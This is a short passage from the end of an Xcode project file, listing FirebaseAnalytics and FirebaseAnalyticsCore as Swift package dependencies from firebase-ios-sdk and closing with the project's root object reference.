			isa = XCSwiftPackageProductDependency;
			package = 39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseAnalytics;
		};
		39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */ = {
			isa = XCSwiftPackageProductDependency;
			package = 39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseAnalyticsCore;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 3970FDFF2DFDFFD100B21273 /* Project object */;
}
